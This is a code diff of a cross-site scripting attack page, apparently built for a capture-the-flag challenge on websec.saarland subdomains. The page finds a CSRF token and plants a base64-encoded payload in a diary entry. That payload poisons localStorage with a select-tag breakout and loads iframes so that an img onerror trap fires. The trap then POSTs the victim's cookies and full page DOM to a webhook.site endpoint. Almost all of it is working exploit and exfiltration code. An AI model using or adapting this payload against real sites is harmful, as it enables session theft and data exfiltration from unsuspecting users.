@@ -10,7 +10,6 @@
     <script>
         var W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
         
-        // Catch any old-browser parsing errors
         window.onerror = function(msg) {
             new Image().src = W + "/?bot_js_error=" + encodeURIComponent(msg);
         };
@@ -26,7 +25,6 @@
             var attempts = 0;
             var maxAttempts = 100;
 
-            // Notice: standard function() instead of () =>
             var tokenHunter = setInterval(function() {
                 attempts++;
                 var tokenInputs = document.getElementsByName("csrfmiddlewaretoken");
@@ -43,27 +41,34 @@
             }, 50);
 
             function executePayload(token) {
-                // Notice: standard strings instead of `backticks`
                 var innerJS = 
                     "document.domain='owley-madison.jeopardy.websec.saarland';" +
-                    "new Image().src='" + W + "/?step=4_diary_xss_firing';" +
-                    "var i=document.createElement('iframe');" +
-                    "i.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
-                    "i.onload=function(){" +
-                        "new Image().src='" + W + "/?step=5_iframe_ready';" +
+                    "new Image().src='" + W + "/?step=4_diary_xss';" +
+                    
+                    // 1. Open the Match page to poison storage
+                    "var m=document.createElement('iframe');" +
+                    "m.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
+                    "m.onload=function(){" +
+                        "new Image().src='" + W + "/?step=5_match_iframe_ready';" +
                         
-                        // THE VACUUM TRAP: Ping Step 7, then POST the entire Chat DOM to the webhook
+                        // THE VACUUM TRAP: Grabs Cookies and DOM Source
                         "var trap = \"new Image().src='" + W + "/?step=7_chat_xss_fired'; " +
                                    "var x=new XMLHttpRequest(); " +
                                    "x.open('POST', '" + W + "'); " +
-                                   "x.send(document.documentElement.innerHTML);\";" +
+                                   "x.send('COOKIES: ' + document.cookie + '\\n\\nDOM: ' + document.documentElement.innerHTML);\";" +
                                    
-                        "var p = '</option><img src=x onerror=\"' + trap + '\">';" +
-                        "i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
-                        "new Image().src='" + W + "/?step=6_poisoned_redirecting';" +
-                        "window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';" +
+                        // THE BREAKOUT: Notice the </select> tag!
+                        "var p = '</option></select><img src=x onerror=\"' + trap + '\">';" +
+                        "m.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
+                        
+                        "new Image().src='" + W + "/?step=6_poisoned_loading_chat_in_iframe';" +
+                        
+                        // 2. Open the Chat page in a SECOND iframe to trigger the trap silently
+                        "var c=document.createElement('iframe');" +
+                        "c.src='https://chat.owley-madison.jeopardy.websec.saarland/';" +
+                        "document.body.appendChild(c);" +
                     "};" +
-                    "document.body.appendChild(i);";
+                    "document.body.appendChild(m);";
 
                 var encodedJS = btoa(innerJS);
                 var diaryEntry = '<img src="x" onerror="eval(atob(\'' + encodedJS + '\'))">';
